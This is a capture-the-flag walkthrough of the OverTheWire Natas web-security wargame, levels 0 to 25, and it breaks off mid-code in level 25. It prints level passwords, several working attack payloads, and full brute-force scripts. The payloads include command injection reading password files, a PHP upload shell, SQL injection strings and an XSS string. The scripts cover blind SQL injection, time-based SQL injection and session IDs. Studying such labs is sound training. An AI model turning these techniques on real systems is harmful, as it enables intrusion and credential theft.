---
title: "[OTW] Natas Write-Up"
permalink: /writeups/otw/natas/
layout: single
sidebar:
  nav: natas
---

#### Natas 00 Solution

___
**URL :** <http://natas0.natas.labs.overthewire.org/> \
**Credentials :**

The password for the next level can be found as a comment in the html body.
```html
<body>
    <h1>natas0</h1>
    <div id="content">
        You can find the password for the next level on this page.
        <!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->
    </div>
</body>
```

#### Natas 01 Solution

___
**URL :** <http://natas1.natas.labs.overthewire.org/> \
**Credentials :** *natas1:0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq*

Right clicking on the page was disabled so we couldn't simply right click and 'inspect element'. Luckily, cmd + shift + u also gives you access to developer tools. Just like the previous level, the password for the next level was in the html body. 
```html
<!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI-->
```

#### Natas 02 Solution

___
**URL :** <http://natas2.natas.labs.overthewire.org/> \
**Credentials :** *natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI*

This time the password was no longer simply a comment in the html body, but instead we're given an img element. 
```html
<body>
    <h1>natas2</h1>
    <div id="content">
        There is nothing on this page
        <img src="files/pixel.png">
    </div>
</body>
```
Following the src destination, I noticed the url changed to http://natas2.natas.labs.overthewire.org/files/pixel.png which made me wonder if there was anything at http://natas2.natas.labs.overthewire.org/files.

![Index file](/assets/images/02-1.png)

Following users.txt, reveals the password for the next level.
```html
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

#### Natas 03 Solution

___
**URL :** <http://natas3.natas.labs.overthewire.org/> \
**Credentials :** *natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH*

#### Natas 04 Solution

___
**URL :** <http://natas4.natas.labs.overthewire.org/> \
**Credentials :** *natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ*

![Index file](/assets/images/04-1.png)

Looking at the network request, there's a referer header.

![Index file](/assets/images/04-2.png)

So all we needed to do was change it to "http://natas5.natas.labs.overthewire.org/". We can do this with curl and the -e flag which allows us to specify the referer.
```html
curl 'http://natas4.natas.labs.overthewire.org/index.php' \
-e http://natas5.natas.labs.overthewire.org/ \
-u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```
Which gives
```html
Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
```

#### Natas 05 Solution

___
**URL :** <http://natas5.natas.labs.overthewire.org/> \
**Credentials :** *natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK*

![Index file](/assets/images/05-1.png)

Inspecting the cookies, theres a loggedin cookie with value 0.

![Index file](/assets/images/05-2.png)

Changing it to 1 and then refreshing the page produces the password for the next level.

![Index file](/assets/images/05-3.png)

#### Natas 06 Solution

___
**URL :** <http://natas6.natas.labs.overthewire.org/> \
**Credentials :** *natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned*

All we are given is an input box and the source code.
```php
<?
include "includes/secret.inc";
if (array_key_exists("submit", $_POST)) {
    if ($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
}
?>
```
Analysing the source code, I wondered if there was anything at http://natas6.natas.labs.overthewire.org/includes/secret.inc/
```html
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

Now all we needed to do was pass in the secret to obtain the password for the next level.

![Index file](/assets/images/06-1.png)

#### Natas 07 Solution

___
**URL :** <http://natas7.natas.labs.overthewire.org/> \
**Credentials :** *natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS*

All we are given is a link to the 'Home' and 'About' page.

![Index file](/assets/images/06-1.png)

After navigating to the 'About' page, I noticed that it makes a GET request with 'About' as a query parameter. 

![Index file](/assets/images/07-2.png)

Passwords are stored at /etc/natas_webpass/natasX so changing the query parameter to /etc/natas_webpass/natas8 gives us the password for level 8.

![Index file](/assets/images/07-3.png)

#### Natas 08 Solution

___
**URL :** <http://natas8.natas.labs.overthewire.org/> \
**Credentials :** *natas8:xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q*

Again, we're only given an input box and the source code. However, the secret is hardcoded into the file AND we're also given the encoding process.
```php
<?
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if (array_key_exists("submit", $_POST)) {
    if (encodeSecret($_POST['secret']) == $encodedSecret) {
        print "Access granted. The password for natas9 is <censored>";
    } else {
        print "Wrong secret";
    }
}
?>
```
Reversing the encoding process gives us the following secret:

![Index file](/assets/images/08-1.png)

Finally, entering the secret gives us the password for the next level.

![Index file](/assets/images/08-2.png)

#### Natas 09 Solution
___
**URL :** <http://natas9.natas.labs.overthewire.org/> \
**Credentials :** *natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t*

```php
<?
$key = "";

if (array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if ($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```
The passthru() function works like execv(). I confirmed this by attempting to chain multiple shell commands

![Index file](/assets/images/09-1.png)

Recall, passwords are stored at /etc/natas_webpass/natasX so we can simply use the 'cat' command:

![Index file](/assets/images/09-2.png)

#### Natas 10 Solution

___
**URL :** <http://natas10.natas.labs.overthewire.org/> \
**Credentials :** *natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu*

Unlike the previous level, certain characters are now filtered. Our previous method of chaining shell commands will not work anymore.
```php
<?
$key = "";

if (array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if ($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

The key to this level is through cleverly choosing the regex pattern for the grep command. Recall, the following regex pattern:
```html
.*
```
This pattern matches any string. Every argument after the pattern provided are the files grep actually checks against the pattern. All we need to do now is add /etc/natas_webpass/natas11 to the list of files grep needs to check. So the following payload:
```html
.* /etc/natas_webpass/natas11
```
gets evaluated as
```html
grep -i .* /etc/natas_webpass/natas11 dictionary.txt
```
giving us

![Index file](/assets/images/10-1.png)

#### Natas 11 Solution

___
**URL :** <http://natas11.natas.labs.overthewire.org/> \
**Credentials :** *natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk*

We are told that "Cookies are protected with XOR encryption" which indicates some cookie manipulation to get the password.

![Index file](/assets/images/11-1.png)

Since we are given the source code, the first thing I analysed was the condition required to get the password:
```php
<?
if ($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}
?>
```
However, by default showpassword is false:
```php
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
```

So our goal is to encode the following:
```php
array( "showpassword"=>"yes", "bgcolor"=>"#ffffff")
```

Luckily, we have access to the encoding used:
```php
base64_encode(xor_encrypt(json_encode($d)))
```

However, xor_encrypt() is a custom encoding and there's no in-built xor_decrypt. We also aren't provided the secret key used for the encryption and we can't just a random key since the same key is used for both encryption and decryption.
```php
function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
```

As a reminder, here is the XOR encryption formula:
```html
plain_text XOR key = cipher_text
```
The key here is recognising that XOR encryption is a symmetrical function, meaning:
```html
cipher_text XOR key = plain_text
```
but more importantly:
```html
plain_text XOR cipher_text = key
```

We have all we need and the following script produces the encoding we will use to replace the default cookie assigned to us:
```php
$payload = array("showpassword"=>"yes", "bgcolor"=>"#ffffff");
$plain_text = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
$cipher_text = 'HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg';

function xor_encrypt($in) {
    $key = $plain_text ^ $cipher_text;
    $text = $in;
    $outText = '';

    // Iterate through each character
    for ($i = 0; $i < strlen($text); $i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

json_decode(xor_encrypt(base64_decode($payload)), true);
```

#### Natas 12 Solution

___
**URL :** <http://natas12.natas.labs.overthewire.org/> \
**Credentials :** *natas12:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk*

I first tried uploading a malicious php file that tries to print the contents of /etc/natas_webpass/natas13:
```html
system("cat /etc/natas_webpass/natas13")
```

![Index file](/assets/images/12-1.png)

For some reason, even though we uploaded a php file, the server stores it as a jpg file:

![Index file](/assets/images/12-2.png)

Analysing the html, the value for the uploaded_file has already been determined so it will always be received by the server as a .jpg file when uploaded:
```html
<form enctype="multipart/form-data" action="index.php" method="POST">
    <input type="hidden" name="MAX_FILE_SIZE" value="1000"/>
    <input type="hidden" name="filename" value="ver2183tf6.jpg"/>

    Choose a JPEG to upload (max 1KB):
    <br/>
    <input name="uploadedfile" type="file"/>
    <br/>
    <input type="submit" value="Upload File"/>
</form>
```
The trick is to manually modify the html so that value attribute is a php file.
```html
<input type="hidden" name="filename" value="ver2183tf6.php">
```
As you can see, now it is being stored on the server as a php file:

![Index file](/assets/images/12-3.png)

Following the link executes the code since it is treated as a php file, showing us a page with just the password:
```html
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```

#### Natas 13 Solution

___
**URL :** <http://natas13.natas.labs.overthewire.org/> \
**Credentials :** *natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC*

Unlike the previous level, the file will be checked that is a jpg file before being uploaded:

![Index file](/assets/images/13-1.png)

The actual check is being done by the following php function which essentially checks the first few bytes of the file:
```php
exif_imagetype($_FILES['uploadedfile']['tmp_name'])
```
Spoofing the file to begin with the signature of a JPG file and then adding our payload after did the trick. We will use python since we need to write raw bytes: 
```py
fh = open('shell.php', 'wb')
fh.write(b'\xFF\xD8\xFF\xE0' + b'<? system("cat /etc/natas_webpass/natas14") ?>')
fh.close()
```
After also doing everything we did in the previous level, we get the password:
```html
z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```

#### Natas 14 Solution

___
**URL :** <http://natas14.natas.labs.overthewire.org/> \
**Credentials :** *natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ*

Analysing the source code, an SQL injection seems possible:
```php
<?php
if (array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if (array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if (mysqli_num_rows(mysqli_query($link, $query)) > 0) {
        echo "Successful login! The password for natas15 is <censored><br>";
    } else {
        echo "Access denied!<br>";
    }
    mysqli_close($link);
}
?>
```
The classic
```html
" OR 1=1; #
```
did the trick:

![Index file](/assets/images/14-1.png)

#### Natas 15 Solution

___
**URL :** <http://natas15.natas.labs.overthewire.org/> \
**Credentials :** *natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx*

Unlike the previous level, the password is no longer printed if our query returns more than 0 rows:
```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if (array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if (array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if ($res) {
        if (mysqli_num_rows($res) > 0) {
            echo "This user exists.<br>";
        } else {
            echo "This user doesn't exist.<br>";
        }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
}
?>
```
Unfortunately, we also don't get given the values of any our queries, only that "This user exists" if our query returned 1 or more rows. What we can do instead is bruteforce the password for the user natas16, 1 character at a time. We know if there's a match if "This user exists" is returned. My initial approach was to use the in-built SQL LEFT() function which only compares X number of characters from the start of the string:
```sql
SELECT username, password FROM users WHERE username="natas16" AND LEFT(password, 1) = "a";
```
Unfortunately, LEFT() is case insensitive so if the password was ABC the script would match abc and move onto the next character. This is why I had to use the LIKE operator instead:
```sql
SELECT username, password FROM users WHERE username="natas16" AND password LIKE BINARY "a%";
```

Here is the full script I used to obtain the password:
```py
import requests
import re

characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

username = "natas15"
password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"

url = "http://natas15.natas.labs.overthewire.org"

session = requests.Session()

current_password = list()

while(True):
    for character in characters:
        print("Trying with: " + "".join(current_password) + character)
        response = session.post(url, data={"username": 'natas16" AND password LIKE BINARY "' + "".join(current_password) + character + '%" #'}, auth=(username, password))
        if "This user exists." in response.text:
            current_password.append(character)
            break
    if len(current_password) == 32:
        break
```

This is a snapshot of what the script is doing:

![Index file](/assets/images/15-1.png)

```html
hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
```

#### Natas 16 Solution

___
**URL :** <http://natas16.natas.labs.overthewire.org/> \
**Credentials :** *natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo*

![Index file](/assets/images/16-1.png)

Recall back to level 10 when we used the following payload:
```html
.* /etc/natas_webpass/natas11
```

This won't work anymore due to the source code wrapping our payload in quotation marks, which means our previous payload will actually look for the pattern .* /etc/natas_webpass/natas11 inside dictionary.txt:
```php
<?
$key = "";

if (array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if ($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```
Luckily, the characters for command substitution ($) has not been whitelisted which means we can essentially run subshell. We will use a similar approach to the previous level where now we will bruteforce the password stored at /etc/natas_webpass/natas17 by checking each character 1 at a time but instead using grep:
```bash
grep -E "^a" /etc/natas_webpass/natas17
```
Unfortunately, we're not done here since although our grep command will return the password if there's a match, we won't be able to ever know if there was a match. For example, suppose the password was abc, passthru will only see:
```bash
passthru("grep -i \"abc\" dictionary.txt");
```
which will actually look for the password inside dictionary.txt (which it won't be). What we can do instead is take a word we definitely know is in dictionary.txt (eg. jump) and append it to our grep payload. This way, the passthru() command will definitely not return a match for "{password}jump" and we will know our current grep payload returned a match, and can then match the next the character. Here is the full script I used to obtain the password:
```py
import requests
import re

characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

username = "natas16"
password = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"

url = "http://natas16.natas.labs.overthewire.org"

session = requests.Session()

current_password = ""

while(True):
 for character in characters:
     print("Trying with: " + current_password + character)
     payload = "$(grep -E " + "^" + current_password + character + " /etc/natas_webpass/natas17)zigzag"
     response = session.post(url, data={"needle": payload, "submit": "Search"}, auth=(username, password))
     if "zigzag" not in response.text:
      current_password += character
      break
      
 if len(current_password) == 32:
  break
```
This is a snapshot of what the script is doing:

![Index file](/assets/images/16-2.png)

```html
EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
```

#### Natas 17 Solution

___
**URL :** <http://natas17.natas.labs.overthewire.org/> \
**Credentials :** *natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC*

This level is very similar to level 15, except now we're given no output for any of our queries.
```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if (array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas17', '<censored>');
    mysqli_select_db($link, 'natas17');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if (array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if ($res) {
        if (mysqli_num_rows($res) > 0) {
            //echo "This user exists.<br>";
        } else {
            //echo "This user doesn't exist.<br>";
        }
    } else {
        //echo "Error in query.<br>";
    }

    mysqli_close($link);
}
?>
```
Again, it seems like a bruteforce approach would work however we need a way to know if our query returned a match. I first tried comparing the request time of queries that returned a match against ones that didn't. 

![Index file](/assets/images/17-1.png)

Unfortunately, the request times were too random and I couldn't find any concrete pattern. This is where the in-built SQL SLEEP() function will be very useful in creating artificial delays in the network so that I can now actually compare network request times. Adding a 2 second sleep in the database if there's a match will indicate if the current payload produced a match. Here is the full script I used to obtain the password:
```py
import requests
import re

characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

username = "natas17"
password = "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"

url = "http://natas17.natas.labs.overthewire.org"

session = requests.Session()

current_password = list()


while(True):
  for character in characters:
    print("Trying with: " + "".join(current_password) + character)
    payload = (
      'natas18" AND IF('
        'password LIKE BINARY "'
            + "".join(current_password) + character + '%"'
          ', SLEEP(2), 0) #'
    )

    response = session.post(url, data={"username": payload},auth=(username, password))
    if response.elapsed.total_seconds() > 2:
      current_password.append(character)
      break
  if len(current_password) == 32:
    break
```
```html
6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
```

#### Natas 18 Solution

___
**URL :** <http://natas18.natas.labs.overthewire.org/> \
**Credentials :** *natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ*

This is the source code we're given:
```php
<?php

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() {
    if ($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}

function isValidID($id) {
    return is_numeric($id);
}

function createID($user) {
    global $maxid;
    return rand(1, $maxid);
}

function debug($msg) {
    if (array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}

function my_session_start() {
    if (array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
        if (!session_start()) {
            debug("Session start failed");
            return false;
        } else {
            debug("Session start ok");
            if(!array_key_exists("admin", $_SESSION)) {
                debug("Session was old: admin flag set");
                $_SESSION["admin"] = 0; // backwards compatible, secure
            }
            return true;
        }
    }

    return false;
}

function print_credentials() {
    if ($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
        print "You are an admin. The credentials for the next level are:<br>";
        print "<pre>Username: natas19\n";
        print "Password: <censored></pre>";
    } else {
        print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}

$showform = true;
if (my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if (array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
        session_id(createID($_REQUEST["username"]));
        session_start();
        $_SESSION["admin"] = isValidAdminLogin();
        debug("New session started");
        $showform = false;
        print_credentials();
    }
}
?>
```

After creating an account, I noticed were given a random PHPSESSID:

![Index file](/assets/images/18-1.png)

Based on the source code telling us there's only 640 ids, it seems a bruteforce approach seems likely where one of the PHPSESSID is associated with the admin account. We will try changing our PHPSESSID from 1 to 640 which the following script does:
```py
import requests
import re

username = "natas18"
password = "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ"

url = "http://natas18.natas.labs.overthewire.org"

session = requests.Session()

MAX = 640
count = 1

for i in range(MAX+1):
  print("Trying with PHPSESSID=", i)
  sessionID = "PHPSESSID=" + str(i)
  headers = {"Cookie": sessionID }
  response = session.get(url, headers=headers, auth=(username, password))
  if "You are an admin" in response.text:
    break

```

![Index file](/assets/images/18-2.png)

Changing our the PHPSESSID to the one our script found and then refreshing the page gives us the password for the next level:

![Index file](/assets/images/18-3.png)

#### Natas 19 Solution

___
**URL :** <http://natas19.natas.labs.overthewire.org/> \
**Credentials :** *natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr*

Unlike the previous level, we are told session ids are no longer sequential:

![Index file](/assets/images/19-1.png)

![Index file](/assets/images/19-2.png)

Some of the characters looked like ASCII characters so I put it into a decoder:

![Index file](/assets/images/19-3.png)

After deleting the id, creating an account with the same name, and then decoding, I started to notice a pattern:

![Index file](/assets/images/19-4.png)

It looks like the id is being generated by prepending a number before the username it is given and then it gets encoded. I decided to write another bruteforce script that cycles through 1-admin to 640-admin to hopefully gain access to admin session:
```py
import requests

username = "natas19"
password = "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"

url = "http://natas19.natas.labs.overthewire.org"

session = requests.Session()

MAX = 640
count = 1

for i in range(MAX+1):
  payload = f"{i}-admin".encode().hex()
  print("Trying with PHPSESSID=", payload)
  sessionID = "PHPSESSID=" + payload
  headers = {"Cookie": sessionID }
  response = session.get(url, headers=headers, auth=(username, password))
  if "You are an admin" in response.text:
    break
```

![Index file](/assets/images/19-5.png)

Again, changing our PHPSESSID to the one our script find produces the password:

![Index file](/assets/images/19-6.png)

#### Natas 20 Solution

___
**URL :** <http://natas20.natas.labs.overthewire.org/> \
**Credentials :** *natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw*

Unike the previous 2 levels, modifying PHPSESSID doesn't seem viable since it looks like a randomly generated string. We're also given new source code:

```php
function print_credentials() {
    if ($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}

function myread($sid) {
    debug("MYREAD $sid");
    if (strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if (!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
        $parts = explode(" ", $line, 2);
        if ($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode() ?: "";
}

function mywrite($sid, $data) {
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data");
    // make sure the sid is alnum only!!
    if (strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
    return true;
}

if (array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}
```

It appears our session id derives its encoding from the contents of a file. It also writes whatever we pass in as our username to a file, which is later read from. This part of the code is particularly interesting:
```php
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
        $parts = explode(" ", $line, 2);
        if ($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
```
It looks like the keys for $_SESSION is obtained from the first word on each line. If we also look at the condition for print_credentials:
```html
$_SESSION["admin"] == 1
```
all we need is a way to put "admin 1" on its own line in the file the server reads and writes to. Luckily we do have a way through the username field which is written to the file! A payload like the following would work:
```html
Kim\nadmin 1
```
We will use curl to make the request and send raw bytes since the browser for some reason treats newlines as a space. Our first request will create the user:
```bash
curl -s -c sess.txt -u natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw -d "name=wee%0Aadmin 1" http://natas20.natas.labs.overthewire.org/index.php
```
The second request will retrieve the password:
```bash
curl -s -b sess.txt -u natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw http://natas20.natas.labs.overthewire.org/index.php
```
```html
You are an admin. The credentials for the next level are:<br><pre>Username: natas21
Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
```
#### Natas 21 Solution

___
**URL :** <http://natas21.natas.labs.overthewire.org/> \
**Credentials :** *natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH*

We're told this level is co-located with another website:
![Index file](/assets/images/21-1.png)

This is what's on the other website:
![Index file](/assets/images/21-2.png)

First, I tried playing around with the website. After changing the bgcolor to red, I noticed the html changed which meant there could be a reflective XSS vulnerability:
```html
<form action="index.php" method="POST">
    align: 
    <input name='align' value='center'/>
    <br>
    fontsize: 
    <input name='fontsize' value='100%'/>
    <br>
    bgcolor: 
    <input name='bgcolor' value='red'/>
    <br>
    <input type="submit" name="submit" value="Update"/>
</form>
```
I then tried the following payload:
```html
red'> <img src=x onerror=alert(1) alt='hi
```
which confirmed there was an reflective XSS vulnerability:

![Index file](/assets/images/21-3.png)

Unfortunately, after playing around with various XSS payloads, I couldn't do much. I then looked at the source code for the condition, which again required
```php
$_SESSION["admin"] = 1
```
I noticed something interesting. The server would create a new key value pair for every data that it is sent:
```php
$form .= '<form action="index.php" method="POST">';
foreach($validkeys as $key => $defval) {
    $val = $defval;
    if (array_key_exists($key, $_SESSION)) {
        $val = $_SESSION[$key];
    } else {
        $_SESSION[$key] = $val;
    }
    $form .= "$key: <input name='$key' value='$val' /><br>";
}
```
So all I needed to was send a request with "admin": 1 in its body! This wasn't hard because there was nothing stopping from modifying the input name:
```html
<form action="index.php" method="POST">
    align: 
    <input name='align' value='center'/>
    <br>
    fontsize: 
    <input name='fontsize' value='100%'/>
    <br>
    bgcolor: 
    <input name='admin' value=1/>
    <br>
    <input type="submit" name="submit" value="Update"/>
</form>
```

The last thing I needed to do was change the PHPSESSID of the original website to match the PHPSESSID of the second website, which gave me the password:

![Index file](/assets/images/21-4.png)

#### Natas 22 Solution

___
**URL :** <http://natas22.natas.labs.overthewire.org/> \
**Credentials :** *natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz*

We're only given the following source code:
```php
<?php
session_start();

if (array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if (!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
      header("Location: /");
    }
}
?>
```

```php
<?php
if (array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
}
?>
```
Analysing the source code, it seemed like all I needed to do was pass in revelio as a query parameter. Unfortunately, I get a blank page and my url didn't change for some reason:

![Index file](/assets/images/22-1.png)

Analysing the network request further, it seems I was redirected to '/':

![Index file](/assets/images/22-2.png)

So I then wondered if I made a curl request would it be any different? I used the following payload:
```bash
curl -u natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz 'http://natas22.natas.labs.overthewire.org/index.php?revelio'
```
It worked!
```html
You are an admin. The credentials for the next level are:<br><pre>Username: natas23
Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs</pre>
```
It seems like browsers automatically follow all redirects.

#### Natas 23 Solution

___
**URL :** <http://natas23.natas.labs.overthewire.org/> \
**Credentials :** *natas23:dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs*

We're given the following source code:
```php
<?php
if (array_key_exists("passwd",$_REQUEST)) {
    if (strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )) {
        echo "<br>The credentials for the next level are:<br>";
        echo "<pre>Username: natas24 Password: <censored></pre>";
    } else {
        echo "<br>Wrong!<br>";
    }
}
?>
```
I first had to search up what strstr() did. All it did was check if a string contained a particular substring, in our case "iloveyou". The condition seemed simple, pass in a string longer than 10 characters with "iloveyou" as a substring. So I tried doing that:

![Index file](/assets/images/23-1.png)

Unfortunately, that did not work. After re-reading the source code, I realised it wasn't actually checking the length of the string, but the actual value of the string. Passing in a number larger than 10 doesn't work, since it will fail the first condition:

![Index file](/assets/images/23-2.png)

I then wondered if something like the following would work:
```html
15iloveyou
```

![Index file](/assets/images/23-3.png)

It appears the way PHP compares a string and number is it will take as many leading characters of the string that form a valid number and ignore the rest which is why our payload worked (15 > 10). This is why strict comparison (===) is important! 

#### Natas 24 Solution

___
**URL :** <http://natas24.natas.labs.overthewire.org/> \
**Credentials :** *natas24:*

We're only given the following source code:
```php
<?php
if (array_key_exists("passwd",$_REQUEST)) {
    if (!strcmp($_REQUEST["passwd"],"<censored>")) {
        echo "<br>The credentials for the next level are:<br>";
        echo "<pre>Username: natas25 Password: <censored></pre>";
    } else{
        echo "<br>Wrong!<br>";
    }
}
?>
```
Unfortunately, there wasn't much to work with. Guessing the password was not a viable option. The only useful thing here was the strcmp() function, so I started looking for vulnerabilities with this in-built PHP function. After reading through the strcmp() documentation, I found a comment that said strcmp() can behave unexpectedly if both of its arguments aren't strings: 

![Index file](/assets/images/24-1.png)

So I tried passing in NULL which didn't work as I think its being processed as a string "NULL":

![Index file](/assets/images/24-2.png)

I then tried changing how 'passwd' was being seen by the server by modifying the inputs name to passwd[]. If you look at the network request, it should now be seen as an array instead of a string:

![Index file](/assets/images/24-3.png)

Just like the comment had mentioned, this produces unexpected behaviour and gives us the password:

![Index file](/assets/images/24-4.png)

#### Natas 25 Solution

___
**URL :** <http://natas25.natas.labs.overthewire.org/> \
**Credentials :** *natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws*

We're given a page with text that we can also change the language the text is displayed in:

![Index file](/assets/images/25-1.png)

We're also given the following source code:
```php
<?php

function setLanguage() {
    /* language setup */
    if (array_key_exists("lang",$_REQUEST))
        if (safeinclude("language/" . $_REQUEST["lang"] ))
